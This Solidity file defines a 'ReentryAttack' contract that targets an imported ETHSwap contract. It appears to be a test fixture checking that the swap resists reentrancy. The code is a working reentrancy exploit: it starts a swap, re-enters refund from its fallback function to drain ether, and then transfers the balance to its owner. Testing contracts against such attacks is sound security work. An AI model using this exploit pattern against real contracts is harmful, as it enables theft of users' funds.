// SPDX-License-Identifier: BlueOak-1.0.0
pragma solidity >=0.7.0 <0.9.0;

import "./ETHSwapV0.sol" as ethswap;

contract ReentryAttack {

    address public owner;
    bytes32 secretHash;
    ethswap.ETHSwap swapper;

    constructor() {
        owner = msg.sender;
    }

    function setUsUpTheBomb(address es, bytes32 sh, uint refundTimestamp, address participant)
        public
        payable
    {
        swapper = ethswap.ETHSwap(es);
        secretHash = sh;
        swapper.initiate{value: msg.value}(refundTimestamp, secretHash, participant);
    }

    function allYourBase()
        public
    {
        swapper.refund(secretHash);
    }

    fallback ()
        external
        payable
    {
        if (address(this).balance < 5 ether) {
            allYourBase();
        }
    }

    function areBelongToUs()
        public
    {
        payable(owner).transfer(address(this).balance);
    }
}
